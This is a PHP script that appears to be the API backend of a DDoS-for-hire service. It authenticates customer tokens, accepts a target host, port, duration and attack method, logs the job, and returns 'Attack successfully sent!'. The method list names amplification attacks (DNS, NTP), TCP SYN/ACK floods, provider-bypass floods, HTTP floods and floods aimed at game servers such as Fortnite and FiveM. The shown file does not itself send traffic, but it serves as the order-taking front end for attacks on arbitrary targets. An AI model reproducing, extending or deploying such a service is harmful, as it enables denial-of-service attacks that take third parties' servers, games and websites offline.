<?php
$base_id_file = 'base_id.txt';
$attacks_file = 'attacks.json';
$tokens_file = 'tokens.json';
$log_file = 'debug.log';

function render_response($response) {
    header('Content-Type: application/json');
    echo json_encode($response);
}

function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - " . $message . PHP_EOL, FILE_APPEND);
}

if (!file_exists($tokens_file)) {
    log_message("Tokens file does not exist.");
    render_response(["status" => "error", "message" => "Server configuration error."]);
    exit;
}

$tokens = json_decode(file_get_contents($tokens_file), true);
if ($tokens === null) {
    log_message("Failed to decode tokens file.");
    render_response(["status" => "error", "message" => "Server configuration error."]);
    exit;
}
$tokens = $tokens['tokens'];

if (file_exists($base_id_file)) {
    $base_id = (int)file_get_contents($base_id_file);
} else {
    $base_id = 0;
}

$ongoing_attacks = file_exists($attacks_file) ? json_decode(file_get_contents($attacks_file), true) : [];

$allowed_methods = [
    'DNS-FREE', 'HTTPS-FREE',
    'DNS', 'NTP', 'MIXAMP', 'SADP',
    'UDP-PPS', 'UDP-BYPASS', 'UDP-VSE',
    'TEAMSPEAK3', 'DISCORD',
    'TCP-ACK', 'TCP-SYN', 'TCP-TLS', 'TCP-MIX', 'TCP-TFO', 'TCP-BYPASS', 'OVH-TCP', 'SOCKET',
    'GAME-RUST', 'GAME-AMONGUS', 'GAME-WARZONE', 'GAME-FORTNITE', 'GAME-OVERWATCH', 'GAME-FIVEM-UDP',
    'GAME-FIVEM-TCP', 'GAME-MTA', 'GAME-PUBG', 'GAME-R6',
    'HTTP-RAW', 'TLS',
    'HTTP-BROWSER', 'HTTP-NEMESIS', 'HTTP-IPV4'
];

function is_valid_ip($host) {
    return filter_var($host, FILTER_VALIDATE_IP);
}

function is_valid_domain($host) {
    $host = parse_url($host, PHP_URL_HOST) ?: $host;
    return filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME);
}

$token = $_GET['token'] ?? '';
$host = $_GET['host'] ?? '';
$port = $_GET['port'] ?? '';
$time = $_GET['time'] ?? '';
$method = $_GET['method'] ?? '';

log_message("Received request: token=$token, host=$host, port=$port, time=$time, method=$method");

if (!in_array($token, $tokens)) {
    log_message("Invalid token: $token");
    header('Content-Type: application/json');
    $response = ["status" => "error", "message" => "Invalid API authorization token."];
    render_response($response);
    exit;
}

if (!is_valid_ip($host) && !is_valid_domain($host)) {
    log_message("Invalid host: $host");
    header('Content-Type: application/json');
    $response = ["status" => "error", "message" => "Invalid API parameter."];
    render_response($response);
    exit;
}

if (!is_numeric($port) || $port <= 0 || $port > 65535) {
    log_message("Invalid port: $port");
    header('Content-Type: application/json');
    $response = ["status" => "error", "message" => "Invalid API parameter."];
    render_response($response);
    exit;
}

if (!is_numeric($time) || $time < 30) {
    log_message("Invalid time: $time");
    header('Content-Type: application/json');
    $response = ["status" => "error", "message" => "Invalid API parameter."];
    render_response($response);
    exit;
}

if (!in_array($method, $allowed_methods)) {
    log_message("Invalid method: $method");
    header('Content-Type: application/json');
    $response = ["status" => "error", "message" => "Invalid API parameter."];
    render_response($response);
    exit;
}

$base_id++;
file_put_contents($base_id_file, $base_id);

$server_type = is_valid_ip($host) ? "#2 - L4" : "#1 - L7";

$ongoing_attacks[$base_id] = [
    "host" => $host,
    "port" => $port,
    "method" => $method,
    "time" => $time,
    "start_time" => time()
];
file_put_contents($attacks_file, json_encode($ongoing_attacks, JSON_PRETTY_PRINT));

$response = [
    "status" => "true",
    "id" => $base_id,
    "message" => "Attack successfully sent!",
    "info" => [
        "host" => $host,
        "subnet" => 32,
        "port" => $port,
        "method" => $method,
        "time" => $time,
        "server" => $server_type
    ]
];

log_message("Sending response: " . json_encode($response));

render_response($response);
?>
